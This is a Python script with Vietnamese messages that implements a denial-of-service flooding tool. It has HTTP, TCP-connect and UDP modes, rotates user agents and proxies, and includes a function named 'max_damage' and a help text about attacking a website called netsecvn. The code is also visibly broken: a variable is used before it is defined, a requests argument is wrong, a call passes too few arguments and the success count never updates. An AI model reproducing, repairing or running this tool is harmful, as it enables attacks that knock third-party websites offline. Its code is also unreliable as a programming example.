import random
import requests
import socket
import struct
import time
from multiprocessing import Pool
import argparse

def send_http_request(url, headers, body, timeout, proxy):
    try:
        response = requests.request('GET', url, headers=headers, data=body, timeout=timeout, proxy={'http': proxy, 'https': proxy})
        success = True if response.status_code == 200 else False
        return {'success': success, 'statusCode': response.status_code, 'proxy': proxy}
    except:
        return {'success': False, 'statusCode': 0, 'proxy': proxy}


def send_syn_connect(pinghost, pingport, timeout):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout / 1000)
        s.connect((pinghost, int(pingport)))
        return {'success': True}
    except Exception as e:
        return {'success': False}


def send_udp_connect(pinghost, udpport, timeout):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout / 1000)
        packet = struct.pack('BBHHH', 0x00, 0x00, 0x13, 0x37, 0x00)
        s.sendto(packet, (pinghost, int(udpport)))
        return {'success': True}
    except:
        return {'success': False}


def max_damage(url, ua, proxy, timeout, duration, concurrency):
    with open(ua, 'r') as f:
        user_agents = f.readlines()
    user_agents = [ua.strip() for ua in user_agents]

    with open(proxy, 'r') as f:
    	proxy = f.readlines()
    proxy = [p.strip() for p in proxy]

    time_end = time.time() + duration
    print(f'Đang gửi requests vô tận tới {url} với timeout là {timeout} ms, số lượng request đồng thời là {concurrency}, và đường dẫn đến file ua là {ua} và proxy là {proxy}. Thời gian gửi là {duration} giây.')

    current_proxy_index = 0
    successful_requests = 0

    def send_http_request_wrapper(url, headers, body, timeout, proxy):
        return send_http_request(url, headers, body, timeout, proxy[current_proxy_index])

    with Pool(processes=concurrency) as pool:
        while time.time() < time_end:
            headers = {'User-Agent': user_agents[random.randint(0, len(user_agents)-1)]}
            pool.apply_async(send_http_request_wrapper, (url, headers, '', timeout))

        pool.close()
        pool.join()

    print(f'Hoàn thành gửi requests vô tận với {successful_requests} requests thành công.')


def main():
    parser = argparse.ArgumentParser(description=f'Tấn công website netsecvn bằng tùy chọn {options}')
    parser.add_argument('--option', type=str, help='Chọn tùy chọn', required=True)

    options = {
        'http': {
            'args': [
                {'name': 'url', 'type': str, 'help': 'URL mà bạn muốn tấn công'},
                {'name': '--header', 'type': str, 'help': 'Header của request'},
                {'name': '--body', 'type': str, 'help': 'Body của request'},
                {'name': '--timeout', 'type': int, 'default': 5000, 'help': 'Thời gian timeout của request (ms)'},
                {'name': '--duration', 'type': int, 'help': 'Thời gian gửi request (giây)', 'required': True},
                {'name': '--concurrency', 'type': int, 'default': 100, 'help': 'Số lượng request đồng thời muốn gửi'},
                {'name': '--ua', 'type': str, 'default': 'ua.txt', 'help': 'Đường dẫn đến file ua.txt'},
                {'name': '--proxy', 'type': str, 'default': 'proxy.txt', 'help': 'Đường dẫn đến file proxy.txt'},
            ],
            'function': max_damage
        },
        'connect': {
            'args': [
                {'name': 'pinghost', 'type': str, 'help': 'Địa chỉ IP hoặc tên miền để ping'},
                {'name': '--pingport', 'type': int, 'default': 80, 'help': 'Cổng để ping'},
                {'name': '--timeout', 'type': int, 'default': 5000, 'help': 'Thời gian timeout của request (ms)'},
                {'name': '--duration', 'type': int, 'help': 'Thời gian gửi request (giây)', 'required': True},
                {'name': '--concurrency', 'type': int, 'default': 100, 'help': 'Số lượng request đồng thời muốn gửi'},
            ],
            'function': send_syn_connect
        },
        'udp': {
            'args': [
                {'name': 'pinghost', 'type': str, 'help': 'Địa chỉ IP hoặc tên miền để gửi UDP CONNECT'},
                {'name': '--udpport', 'type': int, 'default': 80, 'help': 'Cổng để gửi UDP CONNECT'},
                {'name': '--timeout', 'type': int, 'default': 5000, 'help': 'Thời gian timeout của request (ms)'},
                {'name': '--duration', 'type': int, 'help': 'Thời gian gửi request (giây)', 'required': True},
                {'name': '--concurrency', 'type': int, 'default': 100, 'help': 'Số lượng request đồng thời muốn gửi'},
            ],
            'function': send_udp_connect
        }
    }

    for option in options.keys():
        if parser.get_default('option') == option:
            chosen_option = options[option]
            for arg in chosen_option['args']:
                if 'default' not in arg:
                    arg['required'] = True
                parser.add_argument(arg['name'], type=arg['type'], help=arg['help'], default=arg.get('default'))

    args = parser.parse_args()

    chosen_option['function'](args.url, args.ua, args.proxy, args.timeout, args.duration, args.concurrency)

if __name__ == '__main__':
    main()